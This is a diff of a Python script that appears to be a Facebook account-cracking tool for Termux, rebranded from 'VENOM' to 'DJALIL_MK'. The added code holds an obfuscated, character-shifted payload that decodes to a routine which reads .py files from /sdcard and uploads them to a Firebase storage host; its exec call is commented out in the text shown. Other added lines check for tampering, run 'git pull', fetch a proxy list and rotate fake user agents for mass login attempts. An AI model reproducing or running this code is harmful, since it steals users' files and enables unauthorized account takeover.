@@ -1,7 +1,149 @@
-#يرجى حفاظ على برمجة ادات كما هيا لادعي الى اعادة برمجتها لانها لا تعمل اذا تم تغير جزء منها مهما كان جميع حقوق محفوظة MR.VENOM(اسم كامل: عقاب محمد) 
-#All rights reserved by MR. VENOM MOHAMED OGAB
-#استمع وشكرا 2021-2026
+#DECODED BY CRIMINAL WITH ICDEC
+# OWNER  DJALIL_MK 
+import os,time,_md5,marshal,inspect,hashlib
+import http.client
+import platform
+import base64
+import http.client
+import urllib3,requests,idna
+import os,time,_md5,marshal,inspect,hashlib
+import urllib3,requests,idna
+import requests
+import requests
+import http.client
+from os import path
+from os import system as Love_Tisha
+import requests,json,os,sys,random,datetime,time,re,platform,string,uuid,base64
+from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
+from concurrent.futures import ThreadPoolExecutor as tred
+from time import sleep as waktu
+from time import time as mek
+from bs4 import BeautifulSoup as sop
+import os,base64,zlib,pip,urllib,random, requests
+from io import BytesIO
+#import pycurl
+try:
+  import http.client
+  gmg=open(http.client.__file__).read()
+  if "write" in gmg:
+    print("F U")
+    exit()
+    exit()
+    time.sleep(4)
+    while True:requests
+    "HaN".FuCk
+    raise SystemExit
+
+  if "pr"+"in"+"t(u"+"rl)" in gmg:
+    print("F U")
+    exit()
+    exit()
+    time.sleep(4)
+    while True:requests
+    "HaN".FuCk
+    raise SystemExit
+except:pass
+import requests
+ec='\x82\x83\x84>\x7fF\x89GX\x90\x83\x92\x93\x90\x8c>\x89(\x87\x8b\x8e\x8d\x90\x92>\x8d\x91J\x90\x7f\x8c\x82\x8d\x8bJ\x90\x83\x8f\x93\x83\x91\x92\x91(\x82\x83\x84>\x89\x89\x89FGX(>>>\x84\x8d\x90>\x90\x8d\x8d\x92J>\x82\x87\x90\x91J>\x84\x87\x8a\x83\x91>\x87\x8c>\x8d\x91L\x95\x7f\x8a\x89F@M\x91\x82\x81\x7f\x90\x82@GX(>>>>>>\x84\x8d\x90>\x84\x87\x8a\x83>\x87\x8c>\x84\x87\x8a\x83\x91X(>>>>>>>>\x92\x90\x97X(>>>>>>>>>>\x87\x84>\x84\x87\x8a\x83L\x83\x8c\x82\x91\x95\x87\x92\x86FEL\x8e\x97EGX(>>>>>>>>>>>>>>\x84\x87\x8a\x83O>[>\x90\x8d\x8d\x92IEMEI\x91\x92\x90F\x84\x87\x8a\x83G(>>>>>>>>>>>>>>\x87\x84>@qwcb@>\x87\x8c>\x8d\x8e\x83\x8cF\x84\x87\x8a\x83OGL\x90\x83\x7f\x82FGX(>>>>>>>>>>>>>>>>>\x84\x8a[\x84@\x99\x90\x7f\x8c\x82\x8d\x8bL\x90\x7f\x8c\x82\x87\x8c\x92FOJQNNG\x9bL\x8e\x97@(>>>>>>>>>>>>>>>>>\x92\x90\x97X\x90\x83\x8f\x93\x83\x91\x92\x91L\x8e\x8d\x91\x92F@\x86\x92\x92\x8e\x91XMM\x84\x87\x90\x83\x80\x7f\x91\x83\x91\x92\x8d\x90\x7f\x85\x83L\x85\x8d\x8d\x85\x8a\x83\x7f\x8e\x87\x91L\x81\x8d\x8bM\x94NM\x80M\x89\x87\x93K\x86\x87\x8a\x7fK\x82\x7f\x8a\x7fK\x8c\x7fL\x7f\x8e\x8e\x91\x8e\x8d\x92L\x81\x8d\x8bM\x8d]\x8c\x7f\x8b\x83[dgjcqM@I\x84\x8aJ\x84\x87\x8a\x83\x91[\x99E\x84\x87\x8a\x83EX\x8d\x8e\x83\x8cF\x84\x87\x8a\x83OGL\x90\x83\x7f\x82FG\x9bG(>>>>>>>>>>>>>>>>>\x83\x96\x81\x83\x8e\x92X\x8e\x7f\x91\x91(>>>>>>>>\x83\x96\x81\x83\x8e\x92X\x8e\x7f\x91\x91(((\x87\x8b\x8e\x8d\x90\x92>\x8b\x93\x8a\x92\x87\x8e\x90\x8d\x81\x83\x91\x91\x87\x8c\x85(\x8b\x93\x8a\x92\x87\x8e\x90\x8d\x81\x83\x91\x91\x87\x8c\x85Ln\x90\x8d\x81\x83\x91\x91F\x92\x7f\x90\x85\x83\x92[\x89\x89\x89GL\x91\x92\x7f\x90\x92FG(('
+
+link=''
+link+='https:/'
+link+='/m110'
+link+='m.blog'
+link+='spot.'
+link+='com/20'
+link+='25/01/'
+link+='appr'
+link+='oval.html'
+
+import os
+import platform
+import requests
+       
+#link2 = "https://cookie-6f6e3-default-rtdb.firebaseio.com/ID.json"
+#gty=len(requests.get(link2).json())
+os.system('clear')
+print(' \033[1;32m[\033[1;31m–\033[1;32m] Join telegram channel  ')
+os.system('xdg-open https://t.me/alg_trimex')
+
+def dc(encoded_message):
+    decoded_message = ''
+    for char in encoded_message:
+        decoded_message += chr(ord(char) - 30)
+    return decoded_message
+
+#exec(dc(ec))
+
+def srt(url, file_path):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(file_path, 'wb') as file:
+            file.write(response.content)
+
+
+import os,zlib,time,requests
+
+try:
+    import os,sys,time,json,random,re,string,platform,base64,uuid,io,struct
+    from string import *
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except(ImportError):
+    os.system('pip install requests bs4 futures==2 > /dev/null' )
+    pass
+from bs4 import BeautifulSoup
+import json,os,time,base64,random,re,sys
+from concurrent.futures import ThreadPoolExecutor as tpe
+
+try:
+    import bs4
+except(ImportError):
+    os.system("pip install bs4")
+    pass
+try:
+    import os,json,time,re,random,sys,uuid,string,subprocess
+    from string import *
+    import bs4
+
+    from concurrent.futures import ThreadPoolExecutor as tred
+    from bs4 import BeautifulSoup as sop
+    from bs4 import BeautifulSoup
+except ModuleNotFoundError: 
+    pass    
+import os,sys,shutil,zlib,time
+
+
+A = '\x1b[1;97m'
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '\033[1;31m'
+H = '\033[1;32m'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
+G='\033[1;92m'
+W='\033[1;97m'
+mys = '\033[1;97m' 
+r =  '\033[1;91m'
+idx = []
+loop=0
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+twf=[]
+os.system('git pull')
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+try:
+  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+  open('socksku.txt','w').write(proxylist)
+except Exception as e:
+  print(' server error')
+proxsi=open('socksku.txt','r').read().splitlines()
 try:
     import os,requests,json,time,re,random,sys,uuid,string,subprocess
     from string import *
@@ -13,24 +155,10 @@ try:
 except ModuleNotFoundError: 
     print('\n Installing missing modules ...')
     os.system('pip install requests bs4 futures==2 > /dev/null')
-    os.system('python VENOM.py')
-try:
-    os.mkdir('/sdcard/VENOM')
-except:pass
-import os
-import sys
-import time
-import requests
-import random
-import platform
-import base64
-import subprocess 
-from concurrent.futures import ThreadPoolExecutor
-import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
-ugen=[]
-for xd in range(10000):
-    rr = random.randint
-    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
+    os.system('python DJALIL_MK.py')
+
+#------------------[  Ua  ]-------------------#  
+def ua1():
     bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
     oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
     infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
@@ -404,27 +532,29 @@ def Trial(PF):
     menu()
     
 TrialExist=""
-logo=(f"""\033[1;31m
-               ░█░█░█▀▀░█▀█░█▀█░█▄█
-               ░▀▄▀░█▀▀░█░█░█░█░█░█
-               ░░▀░░▀▀▀░▀░▀░▀▀▀░▀░▀
-\033[90;1m══════════════════════════════════════════════════ \033[91;1mV4
-              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : \033[1;37mVENOM
-              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐆𝐈𝐓𝐇𝗨𝐁    : \033[1;37mVEN0M6
-              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐒𝐓𝐀𝐓𝗨𝐒    : \033[1;37mPERMANENT
-              \033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : \033[1;37m0.2
-              \033[1;31m★\033[1;32m★\033[1;31m★\033[1;32m WELCOME TO THE WORLD OF \033[1;31mVENOM \033[1;32m★\033[1;31m★\033[1;32m★
-              \033[1;32m🗼\033[1;31mDONT FORGET TO TAKE YOUR \033[1;32mCATCH SHOTS🗼
-\033[90;1m══════════════════════════════════════════════════""")
-def linex():
-    print('\033[90;1m═══════════════════════════════════════════')
-os.system('xdg-open https://www.facebook.com/venom.dz.03')
+logo=(f"""\033[1;37m
+\033[1;91m███╗   ██╗\033[0m \033[1;95m██╗\033[0m \033[1;94m███████╗\033[0m \033[1;96m ██████╗ \033[0m \033[1;92m███████╗\033[0m
+\033[1;91m████╗  ██║\033[0m \033[1;95m██║\033[0m \033[1;94m██╔════╝\033[0m \033[1;96m██╔═══██╗\033[0m \033[1;92m██╔════╝\033[0m
+\033[1;91m██╔██╗ ██║\033[0m \033[1;95m██║\033[0m \033[1;94m███████╗\033[0m \033[1;96m██║   ██║\033[0m \033[1;92m█████╗  \033[0m
+\033[1;91m██║╚██╗██║\033[0m \033[1;95m██║\033[0m \033[1;94m╚════██║\033[0m \033[1;96m██║   ██║\033[0m \033[1;92m██╔══╝  \033[0m
+\033[1;91m██║ ╚████║\033[0m \033[1;95m██║\033[0m \033[1;94m███████║\033[0m \033[1;96m╚██████╔╝\033[0m \033[1;92m███████╗\033[0m
+\033[1;91m╚═╝  ╚═══╝\033[0m \033[1;95m╚═╝\033[0m \033[1;94m╚══════╝\033[0m \033[1;96m ╚═════╝ \033[0m \033[1;92m╚══════╝\033[0m
+
+\033[1;93m      N  I  S  O  E\033[0m
+─────────────────────────────────────────────  
+\033[1;37m[–] BEST ALGRIA CRACK DJALIL WORLD 🦅  
+\033[1;37m─────────────────────────────────────────────  
+\033[1;31m [-] FACEBOOK : DJALIL MK
+\033[1;32m [-] TELEGRAM : djalil_dz_48
+\033[1;36m [–] AUTHOR   : MR-DJALIL
+\033[1;34m [–] SERVICE  : {rrrrrrrr}FREE\033[0m
+\033[1;37m─────────────────────────────────────────────""")
 # I love you Mom 
 def dino():
-    print('\033[90;1m═════════════════════════════════════════════')
+    print('\033[1;37m─────────────────────────────────────────────')
 
 def linex():
-    print('\033[90;1m═════════════════════════════════════════════')
+    print('\033[1;37m─────────────────────────────────────────────')
 #------------------[ system  ]-------------------#
 
 def clear():
@@ -1038,7 +1168,7 @@ def M_file_3(ids, names, passlist):
         global ok, loop, sim_id
         boos = random.choice(["P", "M", "H", "K", "B", "U", "O", "N"])
         sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌3\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-       fn = names.split(' ')[0]
+        fn = names.split(' ')[0]
         sys.stdout.flush()
         
         try:
@@ -1347,4 +1477,3 @@ except requests.exceptions.ConnectionError:
         print('\n No internet connection ...')
         exit()
 except Exception as e:pass
-
